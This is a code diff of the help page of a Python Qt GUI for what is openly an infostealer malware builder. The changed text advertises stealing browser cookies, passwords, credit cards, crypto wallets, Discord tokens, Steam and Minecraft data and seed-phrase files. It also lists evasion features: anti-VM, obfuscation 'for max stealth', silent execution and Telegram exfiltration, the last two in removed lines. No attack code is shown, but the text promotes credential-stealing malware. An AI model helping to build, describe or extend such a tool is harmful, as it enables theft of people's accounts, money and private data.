@@ -48,26 +48,25 @@ class InfoPage(QWidget):
         layout.addWidget(line)
         
         help_text = """
-        <b>telegram bot</b> - get ur token here: @BotFather<br>
-        <b>chat id</b> - get it here @ChatIDHelperBot<br>
+        <b>Made with ♥️ by Decrypt</b> - Leave a star on github!<br>
         <br>
         <b>stealer:</b><br>
-        • Universal Cookie Decryption - gets cookies from ALL browsers including new versions<br>
-        • Saved Passwords - decrypts passwords from ALL browsers including new versions<br>
+        • Saved Cookies  - gets cookies from ALL browsers <br>
+        • Saved Passwords - decrypts passwords from ALL browsers<br>
         • Credit Cards - decrypts card numbers from Web Data, captures cardholder name and expiry<br>
         • Autofill Data - field names, values, usage counts<br>
         • Browsing History - URLs, titles, visit counts, timestamps<br>
         • Download History - file paths, source URLs, sizes, MIME types<br>
-        • Bookmarks - full recursive tree from Bookmarks JSON<br>
-        • Crypto Wallets - scans 30+ wallet extension IDs, extracts encrypted vault blobs from LevelDB<br>
-        • User Agent Capture - reads browser PE version info, constructs exact UA strings<br>
+        • Crypto Wallets - scans 30+ wallet extension IDs and extracts local desktop wallets.<br>
         • Discord Tokens - gets discord tokens from both app and browser<br>
+        • Steam - Steals steam data<br>
+        • Minecraft - Steals launcher profiles<br>
+        • Sensitive Files - Steals sensitive files like seedphrases etc.<br>
         <br>
         <b>technical info:</b><br>
-        • Three-Layer Discovery - known paths → Windows Registry → filesystem sweep<br>
-        • Multi-User Extraction - enumerates all user profiles via registry + C:Users scan<br>
-        • Silent Execution - zero console windows via Win32 API<br>
-        • Zero Disk Footprint - ZIP built in io.BytesIO, exfiltrated via Telegram<br>
+        • Anti VM - Blocks virtual machines<br>
+        • Debugging - Debug stub to find errors or for testing<br>
+        • Obfuscation - Combine with obfuscator from the multitool for max stealth<br>
         """
         
         help_label = QLabel(help_text)
